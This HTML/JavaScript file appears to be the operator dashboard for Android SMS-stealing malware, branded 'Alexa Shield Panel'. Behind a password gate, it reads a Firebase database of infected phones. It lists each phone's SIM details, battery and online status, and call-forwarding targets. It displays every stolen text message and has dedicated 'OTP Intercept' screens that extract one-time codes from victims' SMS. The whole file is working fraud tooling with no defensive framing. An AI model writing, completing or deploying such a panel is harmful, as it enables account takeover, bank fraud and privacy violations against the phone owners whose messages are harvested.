<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>✦ Alexa Shield Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;color:#1a1a2e;overflow:hidden;height:100dvh}
.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
.scr.act{display:flex}
#logScr{justify-content:center;align-items:center;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e)}
.lbc{width:88%;max-width:400px;background:#fff;border-radius:20px;padding:40px 28px;box-shadow:0 25px 80px rgba(0,0,0,.3);text-align:center}
.lbc .logo{font-size:52px;display:block;margin-bottom:4px}
.lbc h1{font-size:24px;font-weight:900;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.lbc .sub{color:#999;font-size:12px;margin:2px 0 28px}
.lbc .fi{margin-bottom:16px}
.lbc .fi input{width:100%;padding:15px 18px;background:#f5f6fa;border:2px solid #e8e8ed;border-radius:12px;color:#1a1a2e;font-size:16px;outline:none;transition:.25s}
.lbc .fi input:focus{border-color:#667eea;background:#fff}
.lbc .fi input::placeholder{color:#aaa;font-size:13px}
.lbc button{width:100%;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.25s;box-shadow:0 4px 20px rgba(102,126,234,.3)}
.lbc button:active{transform:scale(.97)}
.lbc .er{color:#e74c3c;font-size:13px;margin-top:10px;display:none;font-weight:600}
.top{background:#fff;padding:10px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #e8e8ed;z-index:10;min-height:50px;box-shadow:0 2px 8px rgba(0,0,0,.04);flex-wrap:wrap}
.top .bck{font-size:18px;cursor:pointer;color:#666;background:#f5f6fa;border:none;border-radius:10px;padding:6px 12px;transition:.15s;font-weight:700;flex-shrink:0}
.top .bck:active{background:#e8e8ed;transform:scale(.9)}
.top h2{font-size:14px;font-weight:800;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#1a1a2e}
.top .bdg{font-size:10px;padding:3px 10px;border-radius:20px;background:#e8f5e9;color:#2e7d32;white-space:nowrap;font-weight:600;flex-shrink:0}
.cnt{flex:1;overflow-y:auto;padding:10px 12px;z-index:1;-webkit-overflow-scrolling:touch;background:#f0f2f5}
.srch{display:flex;gap:8px;margin-bottom:10px}
.srch input{flex:1;padding:11px 16px;background:#fff;border:2px solid #e8e8ed;border-radius:12px;color:#1a1a2e;font-size:14px;outline:none;transition:.25s}
.srch input:focus{border-color:#667eea}
.srch input::placeholder{color:#aaa}
.stats{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;margin-bottom:10px}
.stats .s{background:#fff;border-radius:12px;padding:14px 6px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.04)}
.stats .s .v{font-size:22px;font-weight:800;color:#667eea}
.stats .s .l{font-size:8px;color:#999;margin-top:3px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.navq{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
.navq .b{background:#fff;border-radius:12px;padding:12px 4px;text-align:center;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.04);transition:.15s}
.navq .b:active{transform:scale(.94);background:#f5f6fa}
.navq .b .ic{font-size:20px;display:block;margin-bottom:3px}
.navq .b .l{font-size:7px;color:#999;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.tabs{display:flex;gap:5px;margin-bottom:8px;overflow-x:auto;padding:2px 0}
.tabs .t{padding:7px 14px;background:#fff;border:2px solid #e8e8ed;border-radius:10px;color:#666;font-size:11px;cursor:pointer;white-space:nowrap;font-weight:600;transition:.2s}
.tabs .t.act{background:#667eea;border-color:#667eea;color:#fff}
.dev{display:flex;align-items:center;gap:8px;padding:10px 12px;background:#fff;border-radius:12px;margin-bottom:5px;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.04);transition:.12s}
.dev:active{transform:scale(.98)}
.dev .no{font-size:9px;color:#bbb;font-weight:700;min-width:20px;font-family:monospace}
.dev .av{width:32px;height:32px;border-radius:10px;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;color:#fff;font-weight:700}
.dev .i{flex:1;min-width:0}
.dev .i .n{font-size:13px;font-weight:700;color:#1a1a2e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dev .i .n .stt{display:inline-block;width:7px;height:7px;border-radius:50%;margin-left:4px}
.dev .i .n .stt.on{background:#2ecc71;box-shadow:0 0 8px rgba(46,204,113,.4)}
.dev .i .n .stt.off{background:#e74c3c;box-shadow:0 0 8px rgba(231,76,60,.2)}
.dev .i .p{font-size:10px;color:#888;margin-top:2px;display:flex;gap:4px;align-items:center;flex-wrap:wrap}
.dev .i .p .sim{display:inline-flex;align-items:center;gap:3px;padding:1px 6px;border-radius:5px;font-size:9px;font-weight:600}
.dev .i .p .sim.s1{background:#fff8e1;color:#f57f17}
.dev .i .p .sim.s2{background:#f3e5f5;color:#7b1fa2}
.dev .i .m{font-size:9px;color:#aaa;margin-top:3px;display:flex;gap:8px;align-items:center}
.cp{display:inline-flex;align-items:center;gap:3px;cursor:pointer;padding:2px 6px;border-radius:6px;transition:.15s;background:#f5f6fa;border:1px solid #e8e8ed;font-size:10px;color:#667eea;font-weight:600}
.cp:active{background:#667eea;color:#fff;border-color:#667eea}
.cpy{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:7px;background:#f5f6fa;border:1px solid #e8e8ed;cursor:pointer;font-size:11px;color:#667eea;transition:.15s}
.cpy:active{background:#667eea;color:#fff;border-color:#667eea}
.det-card{background:#fff;border-radius:12px;padding:14px;margin-bottom:8px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
.det-card h3{font-size:9px;color:#999;font-weight:700;margin-bottom:8px;padding-bottom:6px;border-bottom:2px solid #f0f2f5;text-transform:uppercase;letter-spacing:1px}
.det-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid #f5f6fa;font-size:12px}
.det-row:last-child{border-bottom:none}
.det-row .lb{color:#999;font-weight:600;font-size:10px;flex-shrink:0;min-width:60px}
.det-row .vl{color:#1a1a2e;font-weight:500;text-align:right;word-break:break-all;display:flex;align-items:center;gap:4px;justify-content:flex-end;flex:1}
.sms-item{display:flex;gap:8px;padding:10px 0;border-bottom:1px solid #f0f2f5}
.sms-item:last-child{border-bottom:none}
.sms-item .sav{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:11px;color:#fff;flex-shrink:0;font-weight:700}
.sms-item .sb{flex:1;min-width:0}
.sms-item .sb .sh{font-size:11px;color:#667eea;font-weight:700;display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.sms-item .sb .sh .viabtn{font-size:9px;color:#999;font-weight:600;cursor:pointer;padding:1px 7px;border-radius:5px;background:#f5f6fa;border:1px solid #e8e8ed;transition:.15s}
.sms-item .sb .sh .viabtn:active{background:#667eea;color:#fff;border-color:#667eea}
.sms-item .sb .sm{font-size:12px;color:#444;margin:4px 0;word-break:break-word;line-height:1.5}
.sms-item .sb .sd{font-size:9px;color:#bbb;display:flex;gap:8px;align-items:center}
.otp-card{background:#fff8e1;border-radius:10px;padding:10px 12px;margin-bottom:5px;border:1px solid #fff3cd}
.otp-card .oh{display:flex;justify-content:space-between;font-size:9px;color:#856404;margin-bottom:3px}
.otp-card .oc{font-family:monospace;font-size:22px;font-weight:800;color:#e65100;letter-spacing:6px;margin-bottom:3px}
.otp-card .od{font-size:10px;color:#856404;word-break:break-all}
.sim-cards{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
.sim-cards .sc{background:#fff;border-radius:12px;padding:14px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
.sim-cards .sc .sbadge{font-size:8px;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
.sim-cards .sc.s1 .sbadge{color:#f57f17}
.sim-cards .sc.s2 .sbadge{color:#7b1fa2}
.sim-cards .sc .scarrier{font-size:18px;font-weight:800;margin:3px 0 6px}
.sim-cards .sc.s1 .scarrier{color:#f57f17}
.sim-cards .sc.s2 .scarrier{color:#7b1fa2}
.sim-cards .sc .sinfo{font-size:10px;color:#888;display:flex;flex-direction:column;gap:3px}
.sim-cards .sc .sempty{font-size:11px;color:#ccc;text-align:center;padding:12px 0}
#toast{position:fixed;bottom:36px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;padding:10px 22px;font-size:12px;z-index:99;opacity:0;transition:.3s;border-radius:10px;white-space:nowrap;max-width:88%;font-weight:600;box-shadow:0 10px 40px rgba(0,0,0,.15)}
@media(max-width:480px){.stats{grid-template-columns:1fr 1fr}.sim-cards{grid-template-columns:1fr}.top{padding:8px 10px}.top h2{font-size:12px}}
</style>
</head>
<body>

<div id="logScr" class="scr act">
  <div class="lbc">
    <span class="logo">🛡️</span>
    <h1>Alexa Shield Panel</h1>
    <div class="sub">device verification &amp; intercept</div>
    <div class="fi"><input type="password" id="loginPass" placeholder="Enter password" autocomplete="off"></div>
    <button onclick="doLogin()">Unlock</button>
    <div class="er" id="loginErr">Invalid password</div>
  </div>
</div>

<div id="mainScr" class="scr">
  <div class="top">
    <h2>🛡️ Alexa Shield</h2>
    <span class="bdg" id="liveBadge">●</span>
  </div>
  <div class="cnt">
    <div class="srch"><input id="srchInp" placeholder="Search number or device..."></div>
    <div class="stats" id="statCards"></div>
    <div class="navq" id="navQs"></div>
    <div id="mainBody"></div>
  </div>
</div>

<div id="detailScr" class="scr">
  <div class="top"><button class="bck" onclick="closeDet()">←</button><h2 id="detTitle">Device</h2><span class="bdg" id="detBadge"></span></div>
  <div class="cnt">
    <div id="detSims"></div>
    <div id="detInfo"></div>
    <div class="tabs" id="detTabs"></div>
    <div id="detBody"></div>
  </div>
</div>

<div id="allSmsScr" class="scr">
  <div class="top"><button class="bck" onclick="closeAllSms()">←</button><h2>📨 All SMS Logs</h2><span class="bdg" id="allSmsCnt">0</span></div>
  <div class="cnt">
    <div class="srch"><input id="smsSrch" placeholder="Search SMS..."></div>
    <div id="allSmsBody"></div>
  </div>
</div>

<div id="otpScr" class="scr">
  <div class="top"><button class="bck" onclick="closeOtps()">←</button><h2>🔑 OTP Intercept</h2><span class="bdg" id="otpCnt">0</span></div>
  <div class="cnt"><div id="otpBody"></div></div>
</div>

<div id="toast"></div>

<script>
const DB='https://lalannew5-default-rtdb.firebaseio.com';
const PW_HASH='842be8efb2f16dd15970017eb8a1e9aeb45d11b04585488110372b6f43150110';

let verifyDev={}, infoData={}, simData={}, smsData={}, callFor={};
let devices=[], allSms=[];
let srchQ='', smsSrchQ='', curDid='', detTab='info';
let showOnline=0, isLoggedIn=false, pollTimer;

function showToast(m){
  const t=document.getElementById('toast');
  t.textContent=m;t.style.opacity='1';
  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
}

function copyText(t){
  if(!t||t==='N/A'||t==='-')return;
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(t).then(()=>showToast('Copied!')).catch(()=>fallbackCopy(t));
  }else fallbackCopy(t);
}
function fallbackCopy(t){
  const ta=document.createElement('textarea');
  ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');showToast('Copied!')}catch(e){}
  document.body.removeChild(ta);
}

async function fbGet(path){
  try{const r=await fetch(DB+'/'+path+'.json');return await r.json()}catch(e){return null}
}

async function sha256(m){
  const b=new TextEncoder().encode(m);
  const h=await crypto.subtle.digest('SHA-256',b);
  return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('');
}

async function doLogin(){
  const p=document.getElementById('loginPass').value.trim();
  const ph=await sha256(p);
  if(ph!==PW_HASH){
    document.getElementById('loginErr').style.display='block';return;
  }
  document.getElementById('logScr').classList.remove('act');
  document.getElementById('mainScr').classList.add('act');
  isLoggedIn=true;
  document.getElementById('mainBody').innerHTML='<div style="padding:60px;text-align:center"><div style="font-size:40px;margin-bottom:12px;opacity:.2">⏳</div><div style="font-size:13px;color:#999">Loading...</div></div>';
  setTimeout(loadAll,100);
}

async function loadAll(){
  const[vd,info,sim,sms,cf]=await Promise.all([
    fbGet('Verify_Device'),
    fbGet('19112024/All_User/Info'),
    fbGet('19112024/All_User/SimINFO'),
    fbGet('19112024/All_User/Sms'),
    fbGet('19112024/All_User/Call_For')
  ]);
  verifyDev=vd||{};infoData=info||{};simData=sim||{};smsData=sms||{};callFor=cf||{};
  buildDevices();
  clearInterval(pollTimer);
  pollTimer=setInterval(()=>{
    fbGet('Verify_Device').then(d=>{if(d){verifyDev=d;buildDevices();renderDash()}});
    fbGet('19112024/All_User/Sms').then(d=>{if(d){smsData=d;buildDevices();renderDash()}});
  },10000);
  renderDash();
}

function buildDevices(){
  devices=[];allSms=[];
  const allKeys=new Set([...Object.keys(verifyDev),...Object.keys(infoData),...Object.keys(simData),...Object.keys(smsData)]);
  allKeys.forEach(did=>{
    const vd=verifyDev[did];
    const inf=Object.values(infoData).find(x=>x.did===did);
    const sim=simData[did];
    const devSms=smsData[did]||{};
    const cf=callFor[did];
    const msgs=typeof devSms==='object'&&!Array.isArray(devSms)?Object.keys(devSms).map(k=>({...devSms[k],smsId:k,did})):[];
    allSms.push(...msgs);
    devices.push({did,verify:vd,info:inf,sim,cf,smsCount:msgs.length});
  });
  allSms.sort((a,b)=>((b.timestamp||Number(b.date)||0)-(a.timestamp||Number(a.date)||0)));
}

function getStatus(did){
  const inf=Object.values(infoData).find(x=>x.did===did);
  if(inf) return inf.status==='Online';
  const vd=verifyDev[did];
  return vd&&vd.Status==='Yes';
}

function getModel(did){
  const inf=Object.values(infoData).find(x=>x.did===did);
  if(inf&&inf.Name) return inf.Name;
  return '';
}

function getNumber(did){
  const vd=verifyDev[did];
  return vd?vd.Number:'';
}

function getDidFromInfoId(iid){
  const inf=infoData[iid];
  return inf?inf.did:iid;
}

function renderDash(){
  if(!isLoggedIn)return;
  const total=devices.length;
  const online=devices.filter(d=>getStatus(d.did)===true||getStatus(d.did)==='Yes').length;
  const uniqueNums=new Set(devices.map(d=>getNumber(d.did)).filter(Boolean));
  const totalSms=allSms.length;
  const otpCount=allSms.filter(s=>s.msg.toUpperCase().includes('OTP')||s.msg.toUpperCase().includes('code')).length;
  document.getElementById('statCards').innerHTML=`
    <div class="s"><div class="v">${total}</div><div class="l">Devices</div></div>
    <div class="s"><div class="v">${totalSms}</div><div class="l">SMS</div></div>
    <div class="s"><div class="v">${online}</div><div class="l">Active</div></div>
    <div class="s"><div class="v">${uniqueNums.size}</div><div class="l">Numbers</div></div>`;
  document.getElementById('navQs').innerHTML=`
    <div class="b" onclick="showScr('mainScr');renderDash()"><span class="ic">🎯</span><span class="l">Devices</span></div>
    <div class="b" onclick="showOtps()"><span class="ic">🔑</span><span class="l">OTPs</span></div>
    <div class="b" onclick="showScr('allSmsScr');renderAllSms()"><span class="ic">📨</span><span class="l">Logs</span></div>
    <div class="b" onclick="renderDash()"><span class="ic">🔄</span><span class="l">Refresh</span></div>`;
  const q=srchQ.toLowerCase();
  const filtered=q?devices.filter(d=>{
    return d.did.toLowerCase().includes(q)||getNumber(d.did).toLowerCase().includes(q)||getModel(d.did).toLowerCase().includes(q);
  }):devices;
  const onDevs=filtered.filter(d=>getStatus(d.did)===true||getStatus(d.did)==='Yes');
  const offDevs=filtered.filter(d=>!(getStatus(d.did)===true||getStatus(d.did)==='Yes'));
  document.getElementById('mainBody').innerHTML=`
    <div class="tabs">
      <div class="t ${showOnline===0?'act':''}" onclick="showOnline=0;renderDash()">All (${filtered.length})</div>
      <div class="t ${showOnline===1?'act':''}" onclick="showOnline=1;renderDash()">● Active (${onDevs.length})</div>
      <div class="t ${showOnline===2?'act':''}" onclick="showOnline=2;renderDash()">○ Inactive (${offDevs.length})</div>
    </div>
    ${(showOnline===1?onDevs:showOnline===2?offDevs:filtered).map((d,i)=>{
      const on=getStatus(d.did);
      const num=getNumber(d.did);
      const model=getModel(d.did);
      const nm=model||num||d.did.slice(0,8);
      return`<div class="dev" onclick="openDet('${d.did}')">
        <span class="no">${i+1}</span>
        <div class="av">${(nm[0]||'?').toUpperCase()}</div>
        <div class="i">
          <div class="n">${nm}<span class="stt ${(on===true||on==='Yes')?'on':'off'}"></span></div>
          <div class="p">
            ${d.sim?`<span class="sim s1">📡${d.sim.sim1||'SIM'}</span>`:''}
            ${d.sim?.sim2?`<span class="sim s2">📡${d.sim.sim2}</span>`:''}
            ${num?`📞${num}`:''}
          </div>
          <div class="m"><span>📨 ${d.smsCount} msgs</span><span>${on===true||on==='Yes'?'● Active':'○ Inactive'}</span></div>
        </div>
      </div>`;
    }).join('')}
    ${!filtered.length?'<div style="padding:50px;text-align:center;color:#bbb;font-size:13px">'+(q?'No matches':'No devices')+'</div>':''}`;
}

document.getElementById('srchInp').addEventListener('input',function(){srchQ=this.value;renderDash()});
document.getElementById('smsSrch').addEventListener('input',function(){smsSrchQ=this.value;renderAllSms()});

function showScr(id){
  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
  document.getElementById(id).classList.add('act');
}

function openDet(did){
  curDid=did;detTab='info';renderDet();showScr('detailScr');
}

function renderDet(){
  const did=curDid;
  const d=devices.find(x=>x.did===did);
  if(!d){showToast('No data');return}
  const on=getStatus(did);
  const num=getNumber(did);
  const model=getModel(did);
  const nm=model||num||did.slice(0,8);
  document.getElementById('detTitle').textContent=nm;
  document.getElementById('detBadge').textContent=on===true||on==='Yes'?'● Active':'○ Inactive';

  if(d.sim){
    const s=d.sim;
    document.getElementById('detSims').innerHTML=`
      <div class="sim-cards">
        <div class="sc s1"><div class="sbadge">📡 SIM 1</div>
          ${s.sim1&&s.sim1.trim()!=='-'&&s.sim1.trim()!==''?`<div class="scarrier">${s.sim1.replace(/^\s*-\s*/,'')}</div><div class="sinfo">
            <span>🔢 SubID: ${s.subID1||'N/A'}</span>
            ${s.subID1?`<span class="cpy" onclick="copyText('${s.subID1}')">📋</span>`:''}
          </div>`:`<div class="sempty">No SIM 1</div>`}
        </div>
        <div class="sc s2"><div class="sbadge">📡 SIM 2</div>
          ${s.sim2&&s.sim2.trim()!=='-'&&s.sim2.trim()!==''?`<div class="scarrier">${s.sim2.replace(/^\s*-\s*/,'')}</div><div class="sinfo">
            <span>🔢 SubID: ${s.subID2||'N/A'}</span>
          </div>`:`<div class="sempty">${s.dualSim==='Yes'?'SIM 2 empty':'No SIM 2'}</div>`}
        </div>
      </div>
      ${s.simStatus?`<div class="det-card" style="margin-top:-4px"><div class="det-row"><span class="lb">SIM Status</span><span class="vl">${s.simStatus}</span></div></div>`:''}`;
  }else{
    document.getElementById('detSims').innerHTML='';
  }

  const infoRows=[];
  if(d.info){
    infoRows.push(['Name',d.info.Name||'-']);
    infoRows.push(['Battery',d.info.Battery?d.info.Battery+'%':'-']);
    infoRows.push(['Status',d.info.status||'-']);
    if(d.info.Id) infoRows.push(['ID',d.info.Id]);
  }
  if(d.verify){
    infoRows.push(['Number',d.verify.Number||'-']);
    infoRows.push(['Verify Status',d.verify.Status||'-']);
    if(d.verify.Body) infoRows.push(['Body',d.verify.Body]);
  }
  if(d.cf){
    infoRows.push(['Call Fwd',d.cf.Status==='Yes'?'✅ Active':'❌ Inactive']);
    if(d.cf.PhoneNumber&&d.cf.PhoneNumber!=='1234567890') infoRows.push(['Fwd To',d.cf.PhoneNumber]);
  }

  let infoHtml=`<div class="det-card"><h3>Device Info</h3>`;
  infoRows.forEach(([l,v])=>{
    const cp=l==='Number'||l==='Name'||l==='Body'||l==='ID'||l==='Fwd To';
    infoHtml+=`<div class="det-row"><span class="lb">${l}</span><span class="vl">${v!=='-'&&cp?`<span class="cp" onclick="copyText('${String(v).replace(/'/g,"\\'")}')">${v}</span>`:v}</span></div>`;
  });
  infoHtml+=`</div>`;
  document.getElementById('detInfo').innerHTML=infoHtml;

  const devSms=smsData[did]||{};
  const msgs=typeof devSms==='object'&&!Array.isArray(devSms)?Object.keys(devSms).map(k=>({...devSms[k],smsId:k,did})).sort((a,b)=>((Number(b.date)||0)-(Number(a.date)||0))):[];
  const otps=msgs.filter(s=>s.msg.toUpperCase().includes('OTP')||s.msg.toUpperCase().includes('CODE'));
  document.getElementById('detTabs').innerHTML=`
    <div class="t ${detTab==='info'?'act':''}" onclick="swDet('info')">Info</div>
    <div class="t ${detTab==='sms'?'act':''}" onclick="swDet('sms')">SMS (${msgs.length})</div>
    <div class="t ${detTab==='otp'?'act':''}" onclick="swDet('otp')">OTP (${otps.length})</div>`;

  if(detTab==='info'){
    document.getElementById('detBody').innerHTML='';
  }else if(detTab==='otp'){
    document.getElementById('detBody').innerHTML=`<div class="det-card"><h3>OTP Intercept (${otps.length})</h3>
      ${otps.map(s=>`<div class="otp-card"><div class="oh"><span>${s.ph||'?'}</span><span>${s.date?new Date(Number(s.date)).toLocaleString():''}</span></div><div class="oc">${(s.msg||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.msg||'').slice(0,300)}</div></div>`).join('')||'<div style="padding:20px;text-align:center;color:#bbb">No OTP found</div>'}
    </div>`;
  }else{
    document.getElementById('detBody').innerHTML=`<div class="det-card"><h3>SMS Logs (${msgs.length})</h3>
      ${msgs.map(s=>`<div class="sms-item"><div class="sav">${(s.ph||'?')[0]}</div><div class="sb">
        <div class="sh">${s.ph||'?'}</div>
        <div class="sm">${s.msg||''}</div>
        <div class="sd"><span>${s.date?new Date(Number(s.date)).toLocaleString():''}</span></div>
      </div></div>`).join('')||'<div style="padding:20px;text-align:center;color:#bbb">No SMS found</div>'}
    </div>`;
  }
}

function swDet(t){detTab=t;renderDet()}

function showOtps(){
  showScr('otpScr');
  const otps=allSms.filter(s=>s.msg.toUpperCase().includes('OTP')||s.msg.toUpperCase().includes('CODE'));
  document.getElementById('otpCnt').textContent=otps.length;
  document.getElementById('otpBody').innerHTML=`
    <div class="det-card"><h3>OTP Intercept (${otps.length})</h3>
      ${otps.slice(0,100).map(s=>`<div class="otp-card"><div class="oh"><span>${s.ph||'?'}</span><span>${s.date?new Date(Number(s.date)).toLocaleString():''}</span><span style="font-size:8px;color:#aaa">via ${s.did?.slice(0,8)}</span></div><div class="oc">${(s.msg||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.msg||'').slice(0,200)}</div></div>`).join('')||'<div style="padding:30px;text-align:center;color:#bbb">No OTP found</div>'}
    </div>`;
}

function renderAllSms(){
  const q=smsSrchQ.toLowerCase();
  const filtered=q?allSms.filter(s=>(s.msg||'').toLowerCase().includes(q)||(s.ph||'').toLowerCase().includes(q)):allSms;
  document.getElementById('allSmsCnt').textContent=allSms.length;
  document.getElementById('allSmsBody').innerHTML=`
    <div class="det-card"><h3>All SMS (${filtered.length}/${allSms.length})</h3>
      ${filtered.slice(0,200).map(s=>`<div class="sms-item"><div class="sav">${(s.ph||'?')[0]}</div><div class="sb">
        <div class="sh">${s.ph||'?'}
          <span class="viabtn" onclick="event.stopPropagation();openDet('${s.did}')">via ${s.did?.slice(0,8)}</span>
        </div>
        <div class="sm">${s.msg||''}</div>
        <div class="sd"><span>${s.date?new Date(Number(s.date)).toLocaleString():''}</span></div>
      </div></div>`).join('')||'<div style="padding:30px;text-align:center;color:#bbb">'+(q?'No matches':'No SMS')+'</div>'}
      ${filtered.length>200?'<div style="text-align:center;padding:10px;color:#aaa;font-size:11px">Showing 200 of '+filtered.length+'</div>':''}
    </div>`;
}

window.closeDet=()=>{curDid='';showScr('mainScr');renderDash()};
window.closeAllSms=()=>{showScr('mainScr');renderDash()};
window.closeOtps=()=>{showScr('mainScr');renderDash()};

document.getElementById('loginPass').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
</script>
</body>
</html>
